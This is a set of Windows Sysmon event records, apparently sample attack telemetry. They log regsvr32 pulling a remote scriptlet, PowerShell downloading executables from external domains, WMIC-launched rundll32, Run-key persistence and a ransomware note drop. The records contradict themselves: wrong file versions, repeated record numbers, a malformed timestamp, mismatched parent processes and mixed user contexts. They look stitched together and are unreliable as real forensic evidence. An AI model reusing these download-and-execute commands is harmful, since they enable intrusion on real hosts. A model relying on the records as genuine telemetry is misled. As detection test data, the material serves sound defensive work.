{"EventTime":"2023-01-02 13:51:57","Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":435463526,"ProcessID":3912,"ThreadID":5876,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"technique_id=T1218.002,technique_name=rundll32.exe","UtcTime":"2023-01-02 13:51:57.310401","ProcessGuid":"{99350301-d723-638d-f601-f92100000000}","Image":"C:\\Windows\\System32\\rundll32.exe","FileVersion":"10.0.17763.1697 (WinBuild.160101.0800)","Description":"Windows host process (Rundll32)","Product":"Microsoft  Windows  Operating System","Company":"Microsoft Corporation","OriginalFileName":"RUNDLL32.EXE","CommandLine":"C:\\Windows\\system32\\RunDll32.exe","CurrentDirectory":"C:\\Users\\Administrator\\AppData\\Local\\FLYSVR","User":"SG\\Administrator","LogonGuid":"{99350301-ce81-638d-665e-c81d00000000}","LogonId":"0x1dc85e65","TerminalSessionId":"3","IntegrityLevel":"Medium","Hashes":"SHA1=A40886F98905F3D9DBDD61DA1D59CCB4F4854758,MD5=80F8E0C26028E83F1EF371D7B44DE3DF,SHA256=9F1E56A3BF293AC536CF4B8DAD57040797D62DBB0CA19C4ED9683B5565549481,IMPHASH=F27A7FC3A53E74F45BE370131953896A","ParentProcessGuid":"{99350301-d723-638d-bfc9-f82100000000}","ParentProcessId":"20392","ParentImage":"C:\\Users\\Administrator\\AppData\\Local\\FLYSVR\\winhost.exe","ParentCommandLine":"C:\\Users\\Administrator\\AppData\\Local\\FLYSVR\\winhost.exe","EventReceivedTime":"2023-01-02 13:51:59","SourceModuleName":"sysmon_in","SourceModuleType":"im_msvistalog"}
{"EventTime":"2023-01-02 13:51:44","Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":435463526,"ProcessID":3912,"ThreadID":5876,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"technique_id=T1218.002,technique_name=excel.exe","UtcTime":"2023-01-02 13:51:44.556229","ProcessGuid":"{99350301-d723-638d-f601-f92100000000}","Image":"C:\\Program Files\\Microsoft Office\\Office14\\EXCEL.EXE","FileVersion":"10.0.17763.1697 (WinBuild.160101.0800)","Description":"Microsoft Excel","Product":"Microsoft Office 2010","Company":"Microsoft Corporation","OriginalFileName":"EXCEL.EXE","CommandLine":"C:\\Program Files\\Microsoft Office\\Office14\\EXCEL.EXE C:\\Windows\\system32\\99.dll","CurrentDirectory":"C:\\Windows\\system32\\","User":"SG\\Administrator","LogonGuid":"{99350301-ce81-638d-665e-c81d00000000}","LogonId":"0x1dc85e65","TerminalSessionId":"3","IntegrityLevel":"Medium","Hashes":"SHA1=DF8DEAF9CBCB11EDEFFDA3E88A91599C391754CB,MD5=DF98006F86D2B5A2E81DA778EEEE8223,SHA256=71F1DDECB1A746F5EE23AEF13B534DD0476938A5A1A6A467255DD87F76132FB5,IMPHASH=DF8DEAF9CBCB11EDEFFDA3E88A91599C391754CB","ParentProcessGuid":"{99350301-d723-638d-bfc9-f82100000000}","ParentProcessId":"20392","ParentImage":"C:\\Users\\Administrator\\AppData\\Local\\Temp\\ie4uinit.exe","ParentCommandLine":"C:\\Users\\Administrator\\AppData\\Local\\Temp\\ie4uinit.exe -ClearIconCache","EventReceivedTime":"2023-01-02 13:51:46","SourceModuleName":"sysmon_in","SourceModuleType":"im_msvistalog"}
{"EventTime":"2023-01-02 13:51:48","Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":435463319,"ProcessID":3912,"ThreadID":5876,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"technique_id=T1059,technique_name=excel.exe","UtcTime":"2023-01-02 13:51:48.498229","ProcessGuid":"{99350301-d715-638d-af83-f02100000000}","Image":"C:\\Windows\\System32\\regsvr32.exe","FileVersion":"10.0.17763.1 (WinBuild.160101.0800)","Description":"Microsoft(C) Register Server","Product":"Microsoft  Windows  Operating System","Company":"Microsoft Corporation","OriginalFileName":"regsvr32.exe","CommandLine":"regsvr32.exe /s /n /u /i:http://example.b.org/Autodiscover 11.dll","CurrentDirectory":"C:\\Windows\\system32\\","User":"SG\\Administrator","LogonGuid":"{99350301-ce81-638d-665e-c81d00000000}","LogonId":"0x1dc85e65","TerminalSessionId":"3","IntegrityLevel":"High","Hashes":"SHA1=DF8DEAF9CBCB11EDEFFDA3E88A91599C391754CB,MD5=DF98006F86D2B5A2E81DA778EEEE8223,SHA256=71F1DDECB1A746F5EE23AEF13B534DD0476938A5A1A6A467255DD87F76132FB5,IMPHASH=DF8DEAF9CBCB11EDEFFDA3E88A91599C391754CB","ParentProcessGuid":"{99350301-d715-638d-3e64-f02100000000}","ParentProcessId":"22568","ParentImage":"C:\\Program Files\\Microsoft Office\\Office14\\EXCEL.EXE","ParentCommandLine":"excel.exe /c regsvr32.exe /s /n /u /i:http://example.b.org/Autodiscover 11.dll","EventReceivedTime":"2023-01-02 13:51:50","SourceModuleName":"sysmon_in","SourceModuleType":"im_msvistalog"}
{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"serhatg.local","DestinationHostname":"-","DestinationIp":"192.42.116.14","DestinationIsIpv6":"false","DestinationPort":"443","DestinationPortName":"domain","EventID":3,"Hostname":"serhatg.local","Image":"C:\\Program Files\\Microsoft Office\\Office14\\EXCEL.EXE","Initiated":"false","Level":4,"Message":"","OpcodeValue":0,"ProcessGuid":"{C784477D-7BE0-620A-2306-000000003C00}","ProcessID":2260,"ProcessId":"6680","Protocol":"tcp","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":84587,"RuleName":"Usermode","SourceHostname":"serhatg.local.local","SourceIp":"10.8.11.24","SourceIsIpv6":"false","SourceName":"Microsoft-Windows-Sysmon","SourcePort":"57706","SourcePortName":"-","ThreadID":2416,"User":"serhatg.local\\serhatg","UserID":"S-1-5-12-789622181-11434791-3080412150-696121","UtcTime":"2023-01-02 13:51:52.573653","Version":5}
<14>Jan  2 13:50:11 serhatg.local Microsoft-Windows-Sysmon[2536]: {"EventTime":1672667411,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":166286,"ProcessID":2536,"ThreadID":4116,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-01-02 13:50:11.294\r\nProcessGuid: {f31bccf6-98d9-63c6-9408-000000001300}\r\nProcessId: 824\r\nImage: C:\\Program Files (x86)\\Google\\Update\\Install\\{1E18C727-6746-43CD-B642-06A8F4747EF8}\\109.0.5414.75_chrome_installer.exe\r\nFileVersion: 109.0.5414.75\r\nDescription: Google Chrome Installer\r\nProduct: Google Chrome Installer\r\nCompany: Google LLC\r\nOriginalFileName: -\r\nCommandLine: \"C:\\Program Files (x86)\\Google\\Update\\Install\\{1E18C727-6746-43CD-B642-06A8F4747EF8}\\109.0.5414.75_chrome_installer.exe\" --verbose-logging --do-not-launch-chrome --channel=stable --system-level /installerdata=\"C:\\Program Files (x86)\\Google\\Update\\Install\\{1E18C727-6746-43CD-B642-06A8F4747EF8}\\guiA7B1.tmp\"\r\nCurrentDirectory: C:\\Program Files (x86)\\Google\\Update\\1.3.36.152\\\r\nUser: SGULBETEKIN\\admin\r\nLogonGuid: {f31bccf6-3e9f-63c1-31a5-020100000000}\r\nLogonId: 0x102A531\r\nTerminalSessionId: 2\r\nIntegrityLevel: High\r\nHashes: MD5=03381BE413DBBF5322EF7E58C483474C,SHA256=28184794C0AE4AAABBAD69118C3F5F3610E8FA3E258728F3E8BAB0246610280D,IMPHASH=A3133D4CDB1FA8965C35BC3678B5CE95\r\nParentProcessGuid: {f31bccf6-98d3-63c6-9208-000000001300}\r\nParentProcessId: 4212\r\nParentImage: C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe\r\nParentCommandLine: \"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe\" /svc C:\\Users\\Admin\\Downloads\\Chrome.Update.9684ff.js\r\nParentUser: NT AUTHORITY\\SYSTEM","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-01-02 13:50:11.294","ProcessGuid":"{f31bccf6-98d9-63c6-9408-000000001300}","Image":"C:\\Program Files (x86)\\Google\\Update\\Install\\{1E18C727-6746-43CD-B642-06A8F4747EF8}\\109.0.5414.75_chrome_installer.exe","FileVersion":"109.0.5414.75","Description":"Google Chrome Installer","Product":"Google Chrome Installer","Company":"Google LLC","OriginalFileName":"-","CommandLine":"\"C:\\Program Files (x86)\\Google\\Update\\Install\\{1E18C727-6746-43CD-B642-06A8F4747EF8}\\109.0.5414.75_chrome_installer.exe\" --verbose-logging --do-not-launch-chrome --channel=stable --system-level /installerdata=\"C:\\Program Files (x86)\\Google\\Update\\Install\\{1E18C727-6746-43CD-B642-06A8F4747EF8}\\guiA7B1.tmp\"","CurrentDirectory":"C:\\Program Files (x86)\\Google\\Update\\1.3.36.152\\","User":"SGULBETEKIN\\admin","LogonGuid":"{f31bccf6-3e9f-63c1-31a5-020100000000}","LogonId":"0x102a531","TerminalSessionId":"2","IntegrityLevel":"High","Hashes":"MD5=03381BE413DBBF5322EF7E58C483474C,SHA256=28184794C0AE4AAABBAD69118C3F5F3610E8FA3E258728F3E8BAB0246610280D,IMPHASH=A3133D4CDB1FA8965C35BC3678B5CE95","ParentProcessGuid":"{f31bccf6-98d3-63c6-9208-000000001300}","ParentProcessId":"4212","ParentImage":"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe","ParentCommandLine":"\"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe\" /svc C:\\Users\\Admin\\Downloads\\Chrome.Update.9684ff.js","ParentUser":"NT AUTHORITY\\SYSTEM","EventReceivedTime":1672667414,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:46:16 serhatg.local Microsoft-Windows-Sysmon[8020]: {"EventTime":1672667176,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":2286,"ProcessID":8020,"ThreadID":4632,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-01-02 13:46:16.000000\r\nProcessGuid: {341034e7-2774-62ec-f606-000000000400}\r\nProcessId: 8548\r\nImage: C:\\Windows\\System32\\wbem\\WMIC.exe\r\nFileVersion: 10.0.19041.1 (WinBuild.160101.0800)\r\nDescription: WMI Commandline Utility\r\nProduct: Microsoft  Windows  Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: wmic.exe\r\nCommandLine: \"C:\\Windows\\System32\\Wbem\\WMIC.exe\" /node:127.0.0.1 process call create \"rundll32.exe C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Word\\Startup\\rem.r,eslmjyvfmjx\"\r\nCurrentDirectory: C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Word\\Startup\\\r\nUser: serhatg.local\\user\r\nLogonGuid: {341034e7-2003-62ec-9167-120000000000}\r\nLogonId: 0x126791\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: MD5=A2EF3F0AD95FDA9262A5F9533B6DD1BD,SHA256=FA78C88DAC91FDF2EAC736E6900AC1EC4AB7A388B8F77A23FFA7E80A4AD29F5A,IMPHASH=D8770F1C24B7AAD7B5CD1817B3FEB2AA\r\nParentProcessGuid: {341034e7-2773-62ec-f406-000000000400}\r\nParentProcessId: 2280\r\nParentImage: C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\r\nParentCommandLine: \"C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\Admin\\AppData\\Local\\Temp\\0520_656407893761.doc\" /o \"rundll32.exe C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Word\\Startup\\rem.r,eslmjyvfmjx\"}\r\nParentUser: serhatg.local\\user","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-01-02 13:46:16.000000","ProcessGuid":"{341034e7-2774-62ec-f606-000000000400}","Image":"C:\\Windows\\System32\\wbem\\WMIC.exe","FileVersion":"10.0.19041.1 (WinBuild.160101.0800)","Description":"WMI Commandline Utility","Product":"Microsoft  Windows  Operating System","Company":"Microsoft Corporation","OriginalFileName":"wmic.exe","CommandLine":"\"C:\\Windows\\System32\\Wbem\\WMIC.exe\" /node:127.0.0.1 process call create \"rundll32.exe C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Word\\Startup\\rem.r,eslmjyvfmjx\"","CurrentDirectory":"C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Word\\Startup\\","User":"serhatg.local\\user","LogonGuid":"{341034e7-2003-62ec-9167-120000000000}","LogonId":"0x126791","TerminalSessionId":"1","IntegrityLevel":"High","Hashes":"MD5=A2EF3F0AD95FDA9262A5F9533B6DD1BD,SHA256=FA78C88DAC91FDF2EAC736E6900AC1EC4AB7A388B8F77A23FFA7E80A4AD29F5A,IMPHASH=D8770F1C24B7AAD7B5CD1817B3FEB2AA","ParentProcessGuid":"{341034e7-2773-62ec-f406-000000000400}","ParentProcessId":"2280","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentCommandLine":"\"powershell.exe\" &amp; {wmic /node:127.0.0.1 process call create \\\"\"rundll32.exe C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Word\\Startup\\rem.r,eslmjyvfmjx\\\"\"}","ParentUser":"serhatg.local\\user","EventReceivedTime":1672667176,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
{"EventTime":"2023-01-02 13:51:50","Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":435463526,"ProcessID":3912,"ThreadID":5876,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"technique_id=T1218.002,technique_name=rundll32.exe","UtcTime":"2023-01-02 13:51:50.891228","ProcessGuid":"{99350301-d723-638d-f601-f92100000000}","Image":"C:\\Windows\\System32\\rundll32.exe","FileVersion":"10.0.17763.1697 (WinBuild.160101.0800)","Description":"Windows host process (Rundll32)","Product":"Microsoft  Windows  Operating System","Company":"Microsoft Corporation","OriginalFileName":"RUNDLL32.EXE","CommandLine":"C:\\Windows\\system32\\RunDll32.exe","CurrentDirectory":"C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\","User":"SG\\Administrator","LogonGuid":"{99350301-ce81-638d-665e-c81d00000000}","LogonId":"0x1dc85e65","TerminalSessionId":"3","IntegrityLevel":"Medium","Hashes":"SHA1=A40886F98905F3D9DBDD61DA1D59CCB4F4854758,MD5=80F8E0C26028E83F1EF371D7B44DE3DF,SHA256=9F1E56A3BF293AC536CF4B8DAD57040797D62DBB0CA19C4ED9683B5565549481,IMPHASH=F27A7FC3A53E74F45BE370131953896A","ParentProcessGuid":"{99350301-d723-638d-bfc9-f82100000000}","ParentProcessId":"20392","ParentImage":"C:\\Program Files (x86)\\ATERA Networks\\AteraAgent\\AteraAgent.exe","ParentCommandLine":"C:\\Program Files (x86)\\ATERA Networks\\AteraAgent\\AteraAgent.exe /i /IntegratorLogin=\"milla@mycompany.com\" /CompanyId=\"1\" /IntegratorLoginUI=\"\" /CompanyIdUI=\"\" /FolderId=\"\" /AccountId=\"\"","EventReceivedTime":"2023-01-02 13:51:55","SourceModuleName":"sysmon_in","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:46:56 serhatg.local Microsoft-Windows-Sysmon[2073]: {"EventTime":1672667216,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":11154,"ProcessID":2073,"ThreadID":4241,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-01-02 13:46:56.000000\r\nProcessGuid: {341034e7-3a71-62fb-610c-000000000600}\r\nProcessId: 2212\r\nImage: C:\\Windows\\System32\\whoami.exe\r\nFileVersion: 10.0.19041.1 (WinBuild.160101.0800)\r\nDescription: whoami - displays logged on user information\r\nProduct: Microsoft  Windows  Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: whoami.exe\r\nCommandLine: \"C:\\Windows\\system32\\whoami.exe\" /groups\r\nCurrentDirectory: C:\\Users\\user\\\r\nUser: serhatg.local\\user\r\nLogonGuid: {341034e7-b7e7-62f4-503c-020000000000}\r\nLogonId: 0x23C50\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88\r\nParentProcessGuid: {341034e7-3431-62fb-510c-000000000600}\r\nParentProcessId: 8040\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" Invoke-WebRequest https://websekir.com/network/index/processingSetRequestBot/?servername=msi -OutFile network.exe\r\nParentUser: serhatg.local\\user","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-01-02 13:46:56.000000","ProcessGuid":"{341034e7-3a71-62fb-610c-000000000600}","Image":"C:\\Windows\\System32\\whoami.exe","FileVersion":"10.0.19041.1 (WinBuild.160101.0800)","Description":"whoami - displays logged on user information","Product":"Microsoft  Windows  Operating System","Company":"Microsoft Corporation","OriginalFileName":"whoami.exe","CommandLine":"\"C:\\Windows\\system32\\whoami.exe\" /groups","CurrentDirectory":"C:\\Users\\user\\","User":"serhatg.local\\user","LogonGuid":"{341034e7-b7e7-62f4-503c-020000000000}","LogonId":"0x23c50","TerminalSessionId":"1","IntegrityLevel":"Medium","Hashes":"MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88","ParentProcessGuid":"{341034e7-3431-62fb-510c-000000000600}","ParentProcessId":"8040","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentCommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" Invoke-WebRequest https://websekir.com/network/index/processingSetRequestBot/?servername=msi -OutFile network.exe","ParentUser":"serhatg.local\\user","EventReceivedTime":1672667216,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:46:57 serhatg.local Microsoft-Windows-Sysmon[2073]: {"EventTime":1672667217,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":11154,"ProcessID":2073,"ThreadID":4241,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-01-02 13:46:57.000000\r\nProcessGuid: {341034e7-3a71-62fb-610c-000000000600}\r\nProcessId: 2212\r\nImage: C:\\Windows\\System32\\whoami.exe\r\nFileVersion: 10.0.19041.1 (WinBuild.160101.0800)\r\nDescription: whoami - displays logged on user information\r\nProduct: Microsoft  Windows  Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: whoami.exe\r\nCommandLine: \"C:\\Windows\\system32\\whoami.exe\" /groups\r\nCurrentDirectory: C:\\Users\\user\\\r\nUser: serhatg.local\\user\r\nLogonGuid: {341034e7-b7e7-62f4-503c-020000000000}\r\nLogonId: 0x23C50\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88\r\nParentProcessGuid: {341034e7-3431-62fb-510c-000000000600}\r\nParentProcessId: 8040\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" Invoke-WebRequest https://quickbooks.pw/nsudobot.bat -OutFile nsudobot.bat\r\nParentUser: serhatg.local\\user","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-01-02 13:7.000000","ProcessGuid":"{341034e7-3a71-62fb-610c-000000000600}","Image":"C:\\Windows\\System32\\whoami.exe","FileVersion":"10.0.19041.1 (WinBuild.160101.0800)","Description":"whoami - displays logged on user information","Product":"Microsoft  Windows  Operating System","Company":"Microsoft Corporation","OriginalFileName":"whoami.exe","CommandLine":"\"C:\\Windows\\system32\\whoami.exe\" /groups","CurrentDirectory":"C:\\Users\\user\\","User":"serhatg.local\\user","LogonGuid":"{341034e7-b7e7-62f4-503c-020000000000}","LogonId":"0x23c50","TerminalSessionId":"1","IntegrityLevel":"Medium","Hashes":"MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88","ParentProcessGuid":"{341034e7-3431-62fb-510c-000000000600}","ParentProcessId":"8040","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentCommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" Invoke-WebRequest https://quickbooks.pw/nsudobot.bat -OutFile nsudobot.bat","ParentUser":"serhatg.local\\user","EventReceivedTime":1672667217,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"serhatg.local","Details":"C:\\ProgramData\\rdpclient.exe","EventID":13,"EventType":"SetValue","Hostname":"serhatg.local","Image":"C:\\Users\\user\\Desktop\\wininst-9.0-amd64.exe","Level":4,"Message":"","OpcodeValue":0,"ProcessGuid":"{C784477D-0B38-635F-7106-000000003000}","ProcessID":2332,"ProcessId":"4556","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":343805,"RuleName":"T1060,RunKey","SourceName":"Microsoft-Windows-Sysmon","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Bandera","ThreadID":692,"UserID":"S-1-5-18","UtcTime":"2023-01-02 13:51:50.116345","Version":2}
<14>Jan  2 13:46:57 serhatg.local Microsoft-Windows-Sysmon[3052]: {"EventTime":1672667217,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":11,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":2,"Task":11,"OpcodeValue":0,"RecordNumber":6081,"ProcessID":3052,"ThreadID":3724,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"File created:\r\nRuleName: technique_id=T1047,technique_name=File System Permissions Weakness\r\nUtcTime: 2023-01-02 13:46:57.654\r\nProcessGuid: {0d99170d-1622-6375-1a01-000000001100}\r\nProcessId: 7828\r\nImage: C:\\Users\\user\\Desktop\\azov.exe\r\nTargetFilename: C:\\Users\\Public\\Music\\RESTORE_FILES.txt\r\nCreationUtcTime: 2023-01-02 13:46:57.654\r\nUser: serhatg.local\\user","Category":"File created (rule: FileCreate)","Opcode":"Info","RuleName":"technique_id=T1047,technique_name=File System Permissions Weakness","UtcTime":"2023-01-02 13:46:57.654","ProcessGuid":"{0d99170d-1622-6375-1a01-000000001100}","Image":"C:\\Users\\user\\Desktop\\azov.exe","TargetFilename":"C:\\Users\\Public\\Music\\RESTORE_FILES.txt","CreationUtcTime":"2023-01-02 13:46:57.654","User":"serhatg.local\\user","EventReceivedTime":1672667217,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:46:57 serhatg.local Microsoft-Windows-Sysmon[3052]: {"EventTime":1672667217,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":11,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":2,"Task":11,"OpcodeValue":0,"RecordNumber":6083,"ProcessID":3052,"ThreadID":3724,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"File created:\r\nRuleName: technique_id=T1047,technique_name=File System Permissions Weakness\r\nUtcTime: 2023-01-02 13:46:57.654\r\nProcessGuid: {0d99170d-1622-6375-1a01-000000001100}\r\nProcessId: 7828\r\nImage: C:\\Users\\user\\Desktop\\azov.exe\r\nTargetFilename: C:\\Users\\Public\\Videos\\RESTORE_FILES.txt\r\nCreationUtcTime: 2023-01-02 13:46:57.654\r\nUser: serhatg.local\\user","Category":"File created (rule: FileCreate)","Opcode":"Info","RuleName":"technique_id=T1047,technique_name=File System Permissions Weakness","UtcTime":"2023-01-02 13:46:57.654","ProcessGuid":"{0d99170d-1622-6375-1a01-000000001100}","Image":"C:\\Users\\user\\Desktop\\azov.exe","TargetFilename":"C:\\Users\\Public\\Videos\\RESTORE_FILES.txt","CreationUtcTime":"2023-01-02 13:46:57.654","User":"serhatg.local\\user","EventReceivedTime":1672667217,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:46:57 serhatg.local Microsoft-Windows-Sysmon[3052]: {"EventTime":1672667217,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":11,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":2,"Task":11,"OpcodeValue":0,"RecordNumber":6082,"ProcessID":3052,"ThreadID":3724,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"File created:\r\nRuleName: technique_id=T1047,technique_name=File System Permissions Weakness\r\nUtcTime: 2023-01-02 13:46:57.654\r\nProcessGuid: {0d99170d-1622-6375-1a01-000000001100}\r\nProcessId: 7828\r\nImage: C:\\Users\\user\\Desktop\\azov.exe\r\nTargetFilename: C:\\Users\\Public\\Pictures\\RESTORE_FILES.txt\r\nCreationUtcTime: 2023-01-02 13:46:57.654\r\nUser: serhatg.local\\user","Category":"File created (rule: FileCreate)","Opcode":"Info","RuleName":"technique_id=T1047,technique_name=File System Permissions Weakness","UtcTime":"2023-01-02 13:46:57.654","ProcessGuid":"{0d99170d-1622-6375-1a01-000000001100}","Image":"C:\\Users\\user\\Desktop\\azov.exe","TargetFilename":"C:\\Users\\Public\\Pictures\\RESTORE_FILES.txt","CreationUtcTime":"2023-01-02 